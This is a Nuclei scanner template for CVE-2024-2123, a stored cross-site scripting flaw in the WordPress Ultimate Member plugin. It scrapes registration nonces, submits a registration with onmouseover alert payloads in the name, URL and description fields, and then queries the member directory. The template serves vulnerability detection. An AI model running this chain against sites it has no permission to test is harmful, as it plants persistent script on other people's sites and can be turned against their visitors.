id: CVE-2024-2123

info:
  name: Ultimate Member <= 2.8.3 – Stored Cross-Site Scripting (XSS)
  author: riteshs4hu
  severity: Medium
  description: |
    The Ultimate Member – User Profile, Registration, Login, Member Directory, Content Restriction & Membership Plugin plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the several parameters in all versions up to, and including, 2.8.3 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-2123
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cve-id: CVE-2024-2123
    cwe-id: CWE-79
    cpe: cpe:2.3:a:ultimatemember:ultimate_member::::::wordpress::*
  metadata:
    verified: true
    max-request: 3
    vendor: Ultimate Member
    product: Ultimate Member Plugin
    framework: wordpress
  tags: wordpress,xss,stored-xss,unauthenticated,ultimate-member,cve

http:
  - raw:
      - |
        GET /register/ HTTP/1.1
        Host: {{Hostname}}
        Accept: */*

    extractors:
      - type: regex
        name: form_id
        group: 1
        internal: true
        regex:
          - 'name="form_id"[^>]*?\bvalue="([0-9]+)"'

      - type: regex
        name: wpnonce
        group: 1
        regex:
           - 'name="_wpnonce"[^>]*?value="([A-Za-z0-9]+)"'
        internal: true

  - raw:
      - |
        POST /register/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Accept: */*

        first_name-{{form_id}}=%22+onmouseover%3D%22alert%28document.domain%29%22&last_name-{{form_id}}=%22+onmouseover%3D%22alert%28document.domain%29%22&user_url-{{form_id}}=%22+onmouseover%3D%22alert%28document.domain%29%22&description=%22+onmouseover%3D%22alert%28document.domain%29%22&form_id={{form_id}}&um_request=&_wpnonce={{wpnonce}}&_wp_http_referer=%2Fregister%

    redirects: true
    cookie-reuse: true
    
  - raw:
      - |
        GET /member/ HTTP/1.1
        Host: {{Hostname}}
    
    redirects: true
    extractors:
      - type: regex
        name: mem_nonce
        group: 1
        internal: true
        regex:
          - 'um_scripts\s*=\s*\{[^}]*"nonce":"([a-zA-Z0-9]+)"'

      - type: regex
        name: directory_id
        group: 1
        internal: true
        regex:
          - '<div class="um[^"]*um-directory[^"]*"[^>]*data-hash="([a-zA-Z0-9]+)"'

  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        directory_id={{directory_id}}&page=&search=&sorting=&gmt_offset=&post_refferer=&nonce={{mem_nonce}}&action=um_get_members

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
